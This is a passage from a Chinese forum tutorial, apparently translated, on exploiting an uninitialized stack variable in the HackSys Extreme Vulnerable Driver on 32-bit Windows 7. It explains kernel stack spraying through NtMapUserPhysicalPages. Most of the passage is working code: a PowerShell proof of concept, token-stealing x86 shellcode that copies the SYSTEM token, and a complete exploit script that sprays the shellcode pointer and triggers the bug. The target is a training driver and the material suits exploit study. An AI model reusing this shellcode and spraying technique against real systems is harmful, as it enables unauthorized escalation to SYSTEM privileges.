
如果我们可以覆盖内核栈上的整型指针为我们 shellcode 的地址就大功告成了，但是这要怎么做呢？看起来内核栈喷射是个办法，我强烈推荐你去阅读@j00ru 的[这篇文章](https://bbs.kanxue.com/elink@671K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3Z5H3x3s2u0#2i4K6u0W2N6X3g2^5K9h3I4D9K9i4g2E0i4K6u0W2L8%4u0Y4i4K6u0r3i4K6y4r3M7q4)9K6c8o6M7$3z5b7`.`.) 。有一个未文档化的函数，`NtMapUserPhysicalPages`，我们不关心它用于干什么，但它的一部分功能是拷贝输入的字节到内核栈上的一个本地缓冲区。最大尺寸可以拷贝`1024*IntPtr::Size`（32 位机器上是 4 字节=>4096 字节）。对我们的需求来说足够了，下面的 POC 用以展示！

```
Add-Type -TypeDefinition @"

using System;

using System.Diagnostics;

using System.Runtime.InteropServices;

using System.Security.Principal;



public static class EVD

{

    [DllImport("ntdll.dll")]

    public static extern uint NtMapUserPhysicalPages(

        IntPtr BaseAddress,

        UInt32 NumberOfPages,

        Byte[] PageFrameNumbers);

}

"@



# $KernelStackSpray = 4*1024

$KernelStackSpray = [System.BitConverter]::GetBytes(0xdeadb33f) * 1024



# This call will fail with NTSTATUS = 0xC00000EF (STATUS_INVALID_PARAMETER_1),

# however, by that time the buffer is already on the Kernel stack ;)

[EVD]::NtMapUserPhysicalPages([IntPtr]::Zero, 1024, $KernelStackSpray) |Out-Null

```

我们在 `NtMapUserPhysicalPages` 函数返回前下一个断点，运行 POC 以检阅内核栈。

![](https://bbs.kanxue.com/upload/attach/201803/530966_KWAV9VGDT3UN8NC.jpg)

完美，在 `NtMapUserPhysicalPages` 返回后，栈应该被设置下去。因此我们可以污染该未初始化栈变量并调用该驱动函数。注意到该喷射是不连续的，巡视之后我发现栈上有大小相当的块（sizable chunks）但是他们被存储的值分割开来（我推测）。幸运的是，我们需要的偏移处可以被正确设置。

还有个关键点是栈不是一成不变的，因此最好在恰好触发 bug 之前进行喷射，这可以避免缓冲区被更少的操作修改。

再一次，我们覆盖该函数调用为那个重用的窃取 token 的 shellcode 地址，它和前面的章节一致无需任何修改。

```
$Shellcode = [Byte[]] @(

    #---[Setup]

    0x60,                               # pushad

    0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, # mov eax, fs:[KTHREAD_OFFSET]

    0x8B, 0x40, 0x50,                   # mov eax, [eax + EPROCESS_OFFSET]

    0x89, 0xC1,                         # mov ecx, eax (Current _EPROCESS structure)

    0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00, # mov ebx, [eax + TOKEN_OFFSET]

    #---[Copy System PID token]

    0xBA, 0x04, 0x00, 0x00, 0x00,       # mov edx, 4 (SYSTEM PID)

    0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, # mov eax, [eax + FLINK_OFFSET] <-|

    0x2D, 0xB8, 0x00, 0x00, 0x00,       # sub eax, FLINK_OFFSET           |

    0x39, 0x90, 0xB4, 0x00, 0x00, 0x00, # cmp [eax + PID_OFFSET], edx     |

    0x75, 0xED,                         # jnz                           ->|

    0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00, # mov edx, [eax + TOKEN_OFFSET]

    0x89, 0x91, 0xF8, 0x00, 0x00, 0x00, # mov [ecx + TOKEN_OFFSET], edx

    #---[Recover]

    0x61,                               # popad

    0xC3                                # ret

)

```

我们的 exp 工作流将如下：

1. 将 shellcode 放在内存任意位置。
2. 使用指向 shellcode 的指针喷射内核栈。
3. 触发未初始化变量漏洞。

## 终结

这就是所有的内容，可以参考下面的完整 exp 来了解更多信息。

```
Add-Type -TypeDefinition @"

using System;

using System.Diagnostics;

using System.Runtime.InteropServices;

using System.Security.Principal;



public static class EVD

{

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]

    public static extern IntPtr CreateFile(

        String lpFileName,

        UInt32 dwDesiredAccess,

        UInt32 dwShareMode,

        IntPtr lpSecurityAttributes,

        UInt32 dwCreationDisposition,

        UInt32 dwFlagsAndAttributes,

        IntPtr hTemplateFile);  



    [DllImport("Kernel32.dll", SetLastError = true)]

    public static extern bool DeviceIoControl(

        IntPtr hDevice,

        int IoControlCode,

        byte[] InBuffer,

        int nInBufferSize,

        byte[] OutBuffer,

        int nOutBufferSize,

        ref int pBytesReturned,

        IntPtr Overlapped);



    [DllImport("kernel32.dll", SetLastError = true)]

    public static extern IntPtr VirtualAlloc(

        IntPtr lpAddress,

        uint dwSize,

        UInt32 flAllocationType,

        UInt32 flProtect);  



    [DllImport("ntdll.dll")]

    public static extern uint NtMapUserPhysicalPages(

        IntPtr BaseAddress,

        UInt32 NumberOfPages,

        Byte[] PageFrameNumbers);

}

"@



# Compiled with Keystone-Engine

# Hardcoded offsets for Win7 x86 SP1

$Shellcode = [Byte[]] @(

    #---[Setup]

    0x60,                               # pushad

    0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, # mov eax, fs:[KTHREAD_OFFSET]

    0x8B, 0x40, 0x50,                   # mov eax, [eax + EPROCESS_OFFSET]

    0x89, 0xC1,                         # mov ecx, eax (Current _EPROCESS structure)

    0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00, # mov ebx, [eax + TOKEN_OFFSET]

    #---[Copy System PID token]

    0xBA, 0x04, 0x00, 0x00, 0x00,       # mov edx, 4 (SYSTEM PID)

    0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, # mov eax, [eax + FLINK_OFFSET] <-|

    0x2D, 0xB8, 0x00, 0x00, 0x00,       # sub eax, FLINK_OFFSET           |

    0x39, 0x90, 0xB4, 0x00, 0x00, 0x00, # cmp [eax + PID_OFFSET], edx     |

    0x75, 0xED,                         # jnz                           ->|

    0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00, # mov edx, [eax + TOKEN_OFFSET]

    0x89, 0x91, 0xF8, 0x00, 0x00, 0x00, # mov [ecx + TOKEN_OFFSET], edx

    #---[Recover]

    0x61,                               # popad

    0xC3                                # ret

)



# Write shellcode to memory

echo "`n[>] Allocating ring0 payload.."

[IntPtr]$ShellcodePtr = [EVD]::VirtualAlloc([System.IntPtr]::Zero, $Shellcode.Length, 0x3000, 0x40)

[System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $ShellcodePtr, $Shellcode.Length)

echo "[+] Payload size: $($Shellcode.Length)"

echo "[+] Payload address: 0x$("{0:X8}" -f $ShellcodePtr.ToInt32())"



$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)



if ($hDevice -eq -1) {

    echo "`n[!] Unable to get driver handle..`n"

    Return

} else {

    echo "`n[>] Driver information.."

    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"

    echo "[+] Handle: $hDevice"

}



# j00ru -> nt!NtMapUserPhysicalPages and Kernel Stack-Spraying Techniques

# Shellocde IntPtr spray..

$KernelStackSpray = [System.BitConverter]::GetBytes($ShellcodePtr.ToInt32()) * 1024

echo "`n[>] Kernel stack spray.."

echo "[+] Spray buffer: $(1024*[IntPtr]::Size)"

echo "[+] Payload size: $([IntPtr]::Size)`n"



echo "[>] Call NtMapUserPhysicalPages & trigger bug.."

echo "[+] Radio silence..`n"

[EVD]::NtMapUserPhysicalPages([IntPtr]::Zero, 1024, $KernelStackSpray) |Out-Null

$Buffer = [System.BitConverter]::GetBytes(0xdeadb33f)

[EVD]::DeviceIoControl($hDevice, 0x22202F, $Buffer, $Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null

```

![](https://bbs.kanxue.com/upload/attach/201803/530966_34MWGH69E2S6YF9.jpg)

[[招生]科锐逆向工程师培训(2026 年 11 月 13 日实地，远程教学同时开班, 第 57 期)](https://bbs.kanxue.com/thread-51839.htm)

最后于 2018-3-15 20:24 被玉涵编辑，原因：
